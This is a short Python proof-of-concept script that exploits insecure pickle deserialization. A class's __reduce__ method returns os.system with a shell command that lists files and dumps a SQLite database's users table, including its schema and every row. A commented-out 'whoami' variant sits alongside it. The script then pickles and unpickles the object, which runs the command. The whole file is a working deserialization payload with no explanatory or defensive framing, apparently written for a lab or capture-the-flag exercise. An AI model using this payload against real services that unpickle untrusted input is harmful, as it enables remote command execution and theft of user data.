import pickle
import os

class Test(object):
        def __reduce__(self):
                cmd = ('ls ; sqlite test.db .tables ; sqlite test.db .schema users ; sqlite test.db "SELECT * FROM users"')
                # cmd = ('whoami')
                return os.system, (cmd,)

a = pickle.dumps(Test())
b = pickle.loads(a)